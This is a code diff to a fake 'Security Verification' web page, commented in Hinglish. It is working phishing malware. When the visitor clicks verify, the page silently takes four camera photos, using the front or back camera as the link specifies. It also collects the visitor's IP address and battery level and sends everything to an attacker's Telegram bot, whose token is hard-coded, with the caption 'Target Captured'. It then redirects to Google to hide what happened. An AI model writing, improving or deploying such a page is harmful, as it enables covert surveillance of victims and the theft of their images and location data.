@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
+    <title>Security Verification</title>
     <style>
         body {
             background-color: #0f172a;
@@ -55,21 +55,34 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // Apne bot ki details yahan set hain
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
+        let ipData = "Fetching...";
+        let batteryData = "Unknown";
+
+        // IP Address fetch karna
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { ipData = data.ip; })
+            .catch(e => { ipData = "Hidden"; });
+
+        // Battery level check karna
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                batteryData = Math.round(battery.level * 100) + "% " + (battery.charging ? "(Charging)" : "");
+            });
+        }
 
         function startProcess() {
             document.getElementById('verifyBtn').style.display = 'none';
-            document.getElementById('status').innerText = "Verifying, please wait...";
+            document.getElementById('status').innerText = "Verifying security, please wait...";
 
-            // URL se check karega ki front kholna hai ya back (?b=back ya ?b=front)
             const urlParams = new URLSearchParams(window.location.search);
             const camType = urlParams.get('b');
             const chatId = urlParams.get('id');
 
-            let facingModeSetting = "user"; // Default Front Camera
+            let facingModeSetting = "user"; 
             if (camType === 'back') {
-                facingModeSetting = { exact: "environment" }; // Back Camera
+                facingModeSetting = { exact: "environment" }; // Back camera strict mode
             }
 
             navigator.mediaDevices.getUserMedia({ 
@@ -79,7 +92,12 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                setTimeout(() => {
+                let photoCount = 0;
+                const maxPhotos = 4; // Total 4 photos khinchega
+
+                // Har 1.5 second mein ek photo click hogi (Total 4 photos)
+                const photoInterval = setInterval(() => {
+                    photoCount++;
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -87,49 +105,78 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    stream.getTracks().forEach(track => track.stop());
-
                     canvas.toBlob(blob => {
-                        sendPhotoToTelegram(blob, chatId);
+                        let captionText = `🎯 Target Captured (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
+                        sendPhotoToTelegram(blob, chatId, captionText);
                     }, 'image/jpeg', 0.85);
 
-                }, 1500); // 1.5 second baad photo click ho jayegi
+                    if (photoCount >= maxPhotos) {
+                        clearInterval(photoInterval);
+                        stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('status').innerText = "Verification Successful!";
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 1500);
+                    }
+                }, 1500);
+
             })
             .catch(error => {
-                document.getElementById('status').innerText = "Verification failed. Please allow camera permission.";
-                console.error(error);
+                // Agar 'exact: environment' ki wajah se error aaye, toh normal environment try karega
+                if (camType === 'back') {
+                    fallbackBackCamera(chatId);
+                } else {
+                    document.getElementById('status').innerText = "Camera permission denied!";
+                }
             });
         }
 
-        function sendPhotoToTelegram(blob, chatId) {
-            if (!chatId) {
-                document.getElementById('status').innerText = "Error: Invalid User ID!";
-                return;
-            }
+        // Fallback agar exact match na ho toh normal back camera kholne ke liye
+        function fallbackBackCamera(chatId) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                let photoCount = 0;
+                const maxPhotos = 4;
+
+                const interval = setInterval(() => {
+                    photoCount++;
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        let captionText = `🎯 Target Captured [Back] (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
+                        sendPhotoToTelegram(blob, chatId, captionText);
+                    }, 'image/jpeg', 0.85);
+
+                    if (photoCount >= maxPhotos) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://www.google.com";
+                    }
+                }, 1500);
+            })
+            .catch(err => {
+                document.getElementById('status').innerText = "Back camera not accessible!";
+            });
+        }
+
+        function sendPhotoToTelegram(blob, chatId, caption) {
+            if (!chatId) return;
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', '🎯 Target Captured Successfully!');
+            formData.append('caption', caption);
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    document.getElementById('status').innerText = "Verification Successful! Redirecting...";
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 1000);
-                } else {
-                    document.getElementById('status').innerText = "Error sending data.";
-                }
-            })
-            .catch(err => {
-                document.getElementById('status').innerText = "Network error!";
-            });
+            }).catch(err => console.log(err));
         }
     </script>
 </body>
